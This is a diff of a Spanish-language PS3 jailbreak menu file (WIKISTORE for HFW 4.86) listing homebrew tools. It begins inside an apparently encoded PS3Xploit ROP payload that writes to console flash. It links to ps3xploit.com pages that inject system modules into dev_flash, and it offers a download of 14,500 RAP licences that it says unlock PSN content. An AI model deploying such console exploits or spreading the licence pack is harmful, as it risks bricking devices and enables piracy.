2ZpbGVfdXNiX3JlYWRsZW5fYWRkcnx0ZW1wbGF0ZV8xX2ZpbGVfdXNiZmRfYWRkcnx8dGVtcGxhdGVfMV9maWxlX2JsaW5kX2FkZHJ8dGVtcGxhdGVfMV9maWxlX2JsaW5kZmRfYWRkcnxzdGF0X2FkZHJ8fEZpbGV8c2VsZWN0fHNlbGVjdGVkfGRldl91c2IwMDB8ZGV2X3VzYjAwMXxkZXZfaGRkMHxpbnB1dHx0eXBlfHNyY2ZpbGV8ZGVzZmlsZXxjaGVja2VkfHNob3dSZXN1bHR8Y2FsbHN1Ynxmcm9tQ2hhckNvZGV8dG9TdHJpbmd8MDB8cmVwZWF0fHN0cnxNYXRofHBvd3xzcmN8c3BhbnxtYXhfbG9vcHN8c2NfZnNfY2xvc2V8c2NfZnNfb3BlbnxmbGFzaF9wYXJ0aXRpb258ZmlsZXN5c3RlbXxtb3VudF9wYXRofGRldl9ibGluZHxzY19zbV9zaHV0ZG93bnxyZWJvb3Rfc2ZfYWRkcnx0b2NfYWRkcnxnYWRnZXQxMl9hZGRyfGdhZGdldF9tb2QzX2FkZHJ8Z2FkZ2V0X21vZDRiX2FkZHJ8UFMzWHBsb2l0fGNvbWJvZmlsZVBhdGh8ZGV2X2ZsYXNofG5hbWV8ZGVzcGF0aHxpbml0Uk9QfGRpc2FibGVpbnB1dHxmYWxzZXxzeXNjYWxsX3IzX3AycHxzeXNjYWxsX3IzcjVfcDJwfG1lbWNweXxnZXRDb21ib1NlbGVjdGVkVmFsdWV8Z2V0UGF0aHxnZXRQYXRoMnwwMDAwfHB1c2h8am9pbnxzdWJzdHJpbmd8cmVhZE1lbW9yeXxzZXRUaW1lb3V0fHRlbXBsYXRlXzFfZmlsZV91c2J8dGVtcGxhdGVfMV9maWxlX2JsaW5kfDB4MTAwMHwweDEwMDAwMHx8ZnNfZmxhZ19yZWFkb25seXxzY19mc193cml0ZXxmc19tb2RlfGZzX2ZsYWdfY3JlYXRlfHNjX2ZzX3JlYWR8c2NfZnNfc3RhdHxoYXJkX3JlYm9vdHxzY19mc191bW91bnR8ZmFpbF9tc2dfZnJhZ3xmYWlsZWR8cHJvZ3Jlc3NfbXNnX2ZyYWcxfHByb2dyZXNzX21zZ19mcmFnMnxnYWRnZXQxX2FkZHJ8Z2FkZ2V0OF9hZGRyfGdhZGdldF9tb2Q0YV9hZGRyfGdhZGdldF9tb2Q0Y19hZGRyfGdhZGdldF9tb2Q3X2FkZHJ8Z2FkZ2V0X21vZDlfYWRkcnxnYWRnZXRfbW9kMTJfYWRkcnxnYWRnZXRfbW9kMTVfYWRkcnxodG1sfHRpdGxlfE9mZmxpbmV8Q29waWVyfGJ5fGgyfGZpbGV8cGF0aHxvbmNoYW5nZXxjaGVja3B8ZGV2X2JkdmR8dGV4dHxtYXhsZW5ndGh8MjAwfHNpemV8Y2hlY2twMnxsYWJlbHxhdXRvX3JlYm9vdHxmb3JtfHJlc3VsdHxldGN8eFJlZ2lzdHJ5fHN5c3x0b3xzZXRJbm5lckhUTUx8aW5uZXJIVE1MfHJvcF9leGl0XzF2YWx8c3RhY2tfZnJhbWVfc3dhcHxvcHRpb25hbF9yZWJvb3RfbmV3fGNvcHlfZmlsZV9vdmVyd3JpdGV8bG9hZF9yM193b3JkX2Zyb21fcHRyXzMyfDB4ODB8Z2V0SW5kZXh8Z2V0Q29tYm9TZWxlY3RlZEluZGV4fGdldFZhbHVlfGdldHJvb3RQYXRofGdldHJvb3RQYXRoMnxpbml0X3J1bnxjbGVhclRpbWVvdXR8fHRvSGV4MTZ8bmV3fEFycmF5fE51bWJlcnxub0V4cG9uZW50c3xzaWdufHJlcGxhY2V8ZnJvbUlFRUU3NTR8Z2VuZXJhdGVJRUVFNzU0fGdlbmVyYXRlRXhwbG9pdHwxMDAwfHN0YWNrX2ZyYW1lX2hvb2t1cHx1NDE0MXxzdGFja19mcmFtZV9leGl0fHRyaWdnZXJYfGNvbG9yfGNvcHl8c3RhcnRfeHx4eHh4fDB4ODAxMDAwMDB8MHg4RDAwMDAwMHwyNDEzMzU0MTc2fGZmc3w0Mjk0OTY3Mjk1fDE2NzA1fGJ5dGVfc2l6ZXxod29yZF9zaXplfDEwNDg1NzZ8MHgwfHRlbXBsYXRlXzFfZmlsZV9idWZfYWRkcnwweDhCMDAwMDAwfDB4MzIzfDB4MUI2fDB4MjQxfDB4MzI0fDB4MzIyfDB4MzIxfDB4Mjh8MHgzMjh8eHh4eENFTExfRlNfSU9TfEJVSUxUSU5fRkxTSDF8Q0VMTF9GU19GQVR8MHgxN0J8MHgxMjAwfDB4MzQ1fEV4cGxvaXR8aW5pdGlhbGl6YXRpb258SW5pdGlhbGl6aW5nfDcyOTYzNDR8dG9jX2VudHJ5MV9hZGRyfDcxODUzNjB8dG9jX2VudHJ5Ml9hZGRyfDc0OTQ0NTZ8dG9jX2VudHJ5M19hZGRyfDcxODUzNTJ8dG9jX2VudHJ5NF9hZGRyfDc2MDIxNzZ8dG9jX2VudHJ5NV9hZGRyfDcyNTU3NTJ8dG9jX2VudHJ5Nl9hZGRyfDYyMDAzNnx8Z2FkZ2V0Ml9hZGRyfHw2MzMyNjQ0fGdhZGdldDNfYWRkcnw4NzI1NDB8Z2FkZ2V0NF9hZGRyfDIyNjcxOTJ8Z2FkZ2V0NV9hZGRyfDEyMjc1NDh8Z2FkZ2V0Nl9hZGRyfDYzODA3NjR8Z2FkZ2V0N19hZGRyfDEzMTAyNHwxMzEwNzJ8Z2FkZ2V0MTFfYWRkcnw1ODc0ODY0fDgyMDgxMnw2MzUyODU2fDgwNzU2fDc1NzI0OHw4OTA1MDB8NDM3NjQ0MHwzNDY4NjR8MTA4MjA0fDI4NjIyNjR8NjgzODR8NjUwMDg2MHwzNzg4ODU2fHdyaXRlfGxtbjd8cHN4fHBsYWNlfGNvbXxPcmlnaW5hbHxzY3JpcHR8VGVhbXxlc2MwcnRkM3d8Ymd1ZXJ2aWxsZXxoYWJpYnxTb3VyY2V8MDAwfDAwMXxoZGR8ZmwxfGZsMnxiZGR8RGVzdGluYXRpb258ZGQwfHUwMHx1MDF8ZGYxfGRmMnxjaGVja2JveHxhcmVib290fEF1dG98UmVib290fGFjdGlvbnxidXR0b258SW5pdGlhbGl6ZXxvbmNsaWNrfGJvZHl8YWxlcnR8V0FSTklOR3xXcml0aW5nfGZsYXNofGlzfGRhbmdlcm91c3xhbmR8Y2FufGxlYWR8cG90ZW50aWFsfGJyaWNrfEluZXhwZXJpZW5jZWR8dXNlcnN8c2hvdWxkfG5vdHxwcm9jZWVkfGdldEVsZW1lbnRzQnlUYWdOYW1lfElOUFVUfGRpc2FibGVkfGluZGV4T2Z8aWxlfGF1dG9fY2xvc2V8d2luZG93fGNsb3NlfDB4MTh8MHhCMHxyZWJvb3RfZnJhbWV8c2VsZWN0ZWRJbmRleHxvcHRpb25zfHNwbGl0fGVFfHJldmVyc2V8TmFOfEluZmluaXR5fGxvY2FsfHBhcnNlRmxvYXR8TkFOfGZmZmZlfDEwMHwweDJ8YnJlYWt8c3RvcmVfd29yZHwweEM3NHx1MkEyRnx1MkYyQXx0cnl8MHg4MDIwMDAwMHwweDhCMjAwMDAwfHVGRDdFfDB4N0VGRHwweDN8MHhCfDB4MkEyRnx1MDEwMnx1N0VGQnwweDMwfDB4ODI4Mnx1RkI3RXwweDdFRkJ8dTdFRkF8dUZBN0V8MHg3RUZBfHwweDgwMDB8Y2F0Y2h8MjAwMHxncmVlbnxzdWNjZXNzZnVsfHJlZCcuc3BsaXQoJ3wnKSwwLHt9KSk="));</String></Pair>
+			</Table>
+			<Table key="han_file_browser">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/file_explorer.png</String></Pair>
+				<Pair key="title"><String>Explorador de Archivos</String></Pair>
+				<Pair key="info"><String>Navegue por el sistema de archivos de la consola (tenga cuidado)</String></Pair>
+			</Table>
+			<Table key="han_file_injector">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_file.png</String></Pair>
+				<Pair key="title"><String>Inyector de archivos</String></Pair>
+				<Pair key="info"><String>Úselo para agregar mods al XMB, a flash u otras operaciones de archivo (Tenga cuidado)</String></Pair>
+			</Table>
+			<Table key="pkg_linker">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/pkglinker.png</String></Pair>
+				<Pair key="title"><String>Instalar Paquetes desde PC</String></Pair>
+				<Pair key="info"><String>Descarga e instala archivos PKG desde el PC con PKG Linker</String></Pair>
+				<Pair key="child"><String>segment</String></Pair>
+			</Table>
+			<Table key="applicable_version">
+				<Pair key="icon"><String>/dev_flash/vsh/resource/explore/icon/recovery_display_minver.png</String></Pair>
+				<Pair key="title"><String>Ver firmware de Fabrica (downgrade)</String></Pair>
+				<Pair key="info"><String>Muestra el Firmware en que vino esta consola (ATENCION usar solo con HEN Activado)</String></Pair>
+				<Pair key="module_name"><String>xai_plugin</String></Pair>
+				<Pair key="module_action"><String>applicable_version</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+				<Pair key="bar_action"><String>none</String></Pair>
+				<Pair key="lbl_half"><String>1</String></Pair>
+			</Table>
+			<Table key="recovery_mode">
+				<Pair key="icon"><String>/dev_flash/vsh/resource/explore/icon/recovery_toggle.png</String></Pair>
+				<Pair key="title"><String>Toggle Recovery Mode</String></Pair>
+				<Pair key="info"><String>Reboot to Recovery Mode (Not supported on NAND models!)</String></Pair>
+				<Pair key="module_name"><String>xai_plugin</String></Pair>
+				<Pair key="module_action"><String>recovery_mode</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+				<Pair key="bar_action"><String>none</String></Pair>
+				<Pair key="lbl_half"><String>1</String></Pair>
+			</Table>
+			<Table key="licencias_raps">
+            	<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/licencias.png</String></Pair>
+				<Pair key="title"><String>14.500 Licencias pkg (raps) solo HEN</String></Pair>
+				<Pair key="info"><String>Descarga al USB las licencias para desbloquear contenido de PSN</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>https://dl.dropbox.com/s/fyk27vvcedqs8ui/Licencias_TheWizWiki.pkg?dl=1</String></Pair>
+			</Table>
+			<Table key="dg_submain3">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/devwiki.png</String></Pair>
+				<Pair key="title"><String>Ver lista de Juegos compatibles PSX/PS2/PS3/PSP para PS3</String></Pair>
+				<Pair key="info"><String>Muestra los juegos compatibles y con cada metodo de conversion</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table>
+			<Table key="canal_youtube">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/thewizwiki.png</String></Pair>
+				<Pair key="title"><String>Mas Tutoriales en YouTube</String></Pair>
+				<Pair key="info"><String>Sigueme en youtube para ver mas videos de PS3</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>https://www.youtube.com/channel/UClh9mrZULUGRQf-2oqPnPaw</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table>
+		</Attributes>
+			<Items>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_file_copier"
+				attr="han_file_copier"
+				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_file_injector"
+				attr="han_file_injector" 				
+				src="#han_file_injector_items"
+				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_file_browser"
+				attr="han_file_browser" 				
+				src="host://localhost/"
+				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="pkg_linker" 
+				attr="pkg_linker"
+				src="#pkg_linker_items"
+				/>
+			<Item class="type:x-xmb/module-action"  key="applicable_version"	attr="applicable_version"/>
+			<Item class="type:x-xmb/module-action"  key="recovery_mode"			attr="recovery_mode"/>
+			<Item class="type:x-xmb/module-action" key="licencias_raps" attr="licencias_raps"/>
+			<Query 
+		    	class="type:x-xmb/folder-pixmap" 
+	    		key="dg_submain3" 
+		    	attr="dg_submain3"
+                src="#dg_submain3_items"
+				/>
+			<Query 
+                class="type:x-xmb/module-action"
+				key="canal_youtube"
+				attr="canal_youtube"
+				/>	
+			</Items>
+		</View>
+		
+		<!-- submenu lista de juegos compatibles -->
+
+	 	<View id="dg_submain3_items"> 
+	<Attributes>
+	<Table key="info_news">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/devwiki.png</String></Pair>
+				<Pair key="title"><String>Juegos Compatibles com cfw2ofw</String></Pair>
+				<Pair key="info"><String>Lista de juegos convertidos de carpeta a PKG no HAN</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://www.psdevwiki.com/ps3/CFW2OFW_Compatibility_List</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table> 
+			<Table key="info_news2">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/devwiki.png</String></Pair>
+				<Pair key="title"><String>Juegos Compatibles PS2 Classics</String></Pair>
+				<Pair key="info"><String>Lista de juegos de PS2 ISO convertidos a ps2 classics</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://www.psdevwiki.com/ps3/PS2_Classics_Emulator_Compatibility_List</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table>
+            <Table key="info_news3">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/devwiki.png</String></Pair>
+				<Pair key="title"><String>Juegos compatibles de PS1</String></Pair>
+				<Pair key="info"><String>Lista de juegos de ps1 convertidos a pkg PS3</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://www.psdevwiki.com/ps3/PS1_Classics_Emulator_Compatibility_List</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table>
+            <Table key="info_news4">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/devwiki.png</String></Pair>
+				<Pair key="title"><String>Juegos Compatibles de PSP</String></Pair>
+				<Pair key="info"><String>Lista de juegos de PSP convertidos para PS3</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://www.psdevwiki.com/ps3/PSP_Emulator_Compatibility_List</String></Pair>
+				<Pair key="ingame"><String>disable</String></Pair>
+			</Table>			
+		</Attributes> 
+		    <Items> 
+				<Query 
+				class="type:x-xmb/module-action"
+				key="info_news"
+				attr="info_news"
+					/>
+				<Query 
+				class="type:x-xmb/module-action"
+				key="info_news2"
+				attr="info_news2"
+					/>
+				<Query 
+				class="type:x-xmb/module-action"
+				key="info_news3"
+				attr="info_news3"
+					/>
+				<Query 
+				class="type:x-xmb/module-action"
+				key="info_news4"
+				attr="info_news4"
+					/>							
+			</Items>
+		</View>				
+		
+<!-- Inyector de archivos -->
+		
+		<View id="han_file_injector_items"> 
+		<Attributes> 
+			<Table key="han_inject_coldboot_raf">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_coldboot.png</String></Pair>
+				<Pair key="title"><String>Inject Coldboots (Boot Logo y Sound)</String></Pair>
+				<Pair key="info"><String>Copy coldboot_*.* to dev_flash/vsh/resource/coldboot_*.*</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/coldboot/coldboot_installer.html</String></Pair>
+			</Table>
+			<Table key="inject_coldboot_raf_auto">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_coldboot.png</String></Pair>
+				<Pair key="title"><String>Inject Coldboot Auto</String></Pair>
+				<Pair key="info"><String>Copy downloaded coldboot_*.* from WIKISTORE/USRDIR/files to dev_flash/vsh/resource/coldboot_*.*</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/autoxml/han/extras/coldboot_installer/coldboot_installer_auto_WIKISTORE.html</String></Pair>
+			</Table>
+			<Table key="han_inject_rco">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_rco.png</String></Pair>
+				<Pair key="title"><String>Inject RCO (System Resource)</String></Pair>
+				<Pair key="info"><String>Copy *.rco to dev_flash/vsh/resource/*.rco</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_rco_replacer/flash_rco_replacer.html</String></Pair>
+			</Table>
+			<Table key="han_inject_xml">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_xml.png</String></Pair>
+				<Pair key="title"><String>Inject XML (XMB Layout)</String></Pair>
+				<Pair key="info"><String>Copy *.xml to dev_flash/vsh/resource/explore/xmb/*.xml</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_xml_replacer/flash_xml_replacer.html</String></Pair>
+			</Table>
+			<Table key="han_inject_self">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_executable.png</String></Pair>
+				<Pair key="title"><String>Inject SELF (Modules)</String></Pair>
+				<Pair key="info"><String>Copy *.self to dev_flash/vsh/*/*.self</String></Pair>
+			</Table>
+			<Table key="han_inject_sprx">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_executable.png</String></Pair>
+				<Pair key="title"><String>Inject SPRX (VSH Modules)</String></Pair>
+				<Pair key="info"><String>Copy *.sprx to dev_flash/vsh/module/*.sprx</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_sprx_replacer/flash_sprx_replacer_module.html</String></Pair>
+			</Table>
+			<Table key="han_inject_sprx_int">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_executable.png</String></Pair>
+				<Pair key="title"><String>Inject SPRX (Internal Library)</String></Pair>
+				<Pair key="info"><String>Copy *.sprx to dev_flash/sys/internal/*.sprx</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_sprx_replacer/flash_sprx_replacer_sys_internal.html</String></Pair>
+			</Table>
+			<Table key="han_inject_sprx_ext">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_executable.png</String></Pair>
+				<Pair key="title"><String>Inject SPRX (External Library)</String></Pair>
+				<Pair key="info"><String>Copy *.sprx to dev_flash/sys/external/*.sprx</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_sprx_replacer/flash_sprx_replacer_sys_external.html</String></Pair>
+			</Table>
+			<Table key="han_inject_lines">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_wave.png</String></Pair>
+				<Pair key="title"><String>Inject Lines.qrc (Wave)</String></Pair>
+				<Pair key="info"><String>Copy lines.qrc to dev_flash/vsh/resource/qgl/lines.qrc</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/xmb_wave_installer/xmb_wave_installer.html</String></Pair>
+			</Table>
+			<Table key="han_inject_imagefont">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_emoji.png</String></Pair>
+				<Pair key="title"><String>Inject Imagefont.bin (Emojis and Icons)</String></Pair>
+				<Pair key="info"><String>Copy imagefont.bin to dev_flash/vsh/resource/imagefont.bin</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/imagefont/imagefont_replacer.html</String></Pair>
+			</Table>
+			<Table key="han_inject_font">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_font.png</String></Pair>
+				<Pair key="title"><String>Inject TTF (Font)</String></Pair>
+				<Pair key="info"><String>Copy *.ttf to dev_flash/data/font/*.ttf</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_font_replacer/flash_font_replacer.html</String></Pair>
+			</Table>
+			<Table key="han_inject_remove_cert">
+				<Pair key="icon"><String>/dev_hdd0/game/WIKISTORE/USRDIR/IMAGES/XMB/inj_cert.png</String></Pair>
+				<Pair key="title"><String>Inject / Remove Cert (SSL Cert)</String></Pair>
+				<Pair key="info"><String>Copy / Delete certs at dev_flash/data/cert/*.cer</String></Pair>
+			</Table>
+		</Attributes>
+			<Items>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_coldboot_raf"
+				attr="han_inject_coldboot_raf"
+				/>
+				<Query 
+				class="type:x-xmb/module-action" 
+				key="inject_coldboot_raf_auto" 
+				attr="inject_coldboot_raf_auto"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_rco"
+				attr="han_inject_rco"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_xml"
+				attr="han_inject_xml"
+				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_inject_self"
+				attr="han_inject_self"
+				src="#han_inject_self_items"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_sprx"
+				attr="han_inject_sprx"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_sprx_int"
+				attr="han_inject_sprx_int"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_sprx_ext"
+				attr="han_inject_sprx_ext"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_lines"
+				attr="han_inject_lines"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_imagefont"
+				attr="han_inject_imagefont"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_font"
+				attr="han_inject_font"
+				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_inject_remove_cert"
+				attr="han_inject_remove_cert"
+				src="#han_inject_remove_cert_items"
+				/>
+			</Items>
+		</View>
+		
+<!-- PKG Linker 2.1+ Paths -->
+		
+		<View id="pkg_linker_items"> 
+			<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="server_setup" attr="server_setup" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/server_setup.xml#server_setup_items"/>
+			
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_1" attr="pkg_folder_1" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_1.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_2" attr="pkg_folder_2" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_2.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_3" attr="pkg_folder_3" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_3.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_4" attr="pkg_folder_4" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_4.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_5" attr="pkg_folder_5" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_5.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_6" attr="pkg_folder_6" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_6.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_7" attr="pkg_folder_7" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_7.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_8" attr="pkg_folder_8" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_8.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_9" attr="pkg_folder_9" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_9.xml#package_link_game"/> 
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_10" attr="pkg_folder_10" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_10.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_11" attr="pkg_folder_11" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_11.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_12" attr="pkg_folder_12" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_12.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_13" attr="pkg_folder_13" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_13.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_14" attr="pkg_folder_14" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_14.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_15" attr="pkg_folder_15" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_15.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_16" attr="pkg_folder_16" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_16.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_17" attr="pkg_folder_17" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_17.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_18" attr="pkg_folder_18" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_18.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_19" attr="pkg_folder_19" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_19.xml#package_link_game"/> 
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_20" attr="pkg_folder_20" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_20.xml#package_link_game"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_root" attr="pkg_folder_root" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/pkg_folder_root.xml#pkg_items"/>
+			<Query class="type:x-xmb/folder-pixmap" key="pkg_folder_old" attr="pkg_folder_old" src="xmb://localhost/dev_hdd0/game/PKGLINKER/USRDIR/package_link.xml#package_link_game"/>
+			</Items>
+		</View>
+		<!-- HFW 4.86 WIKISTORE 1.0.4 [Ultimo Update: 01/05/2020] -->
+</XMBML>
+		
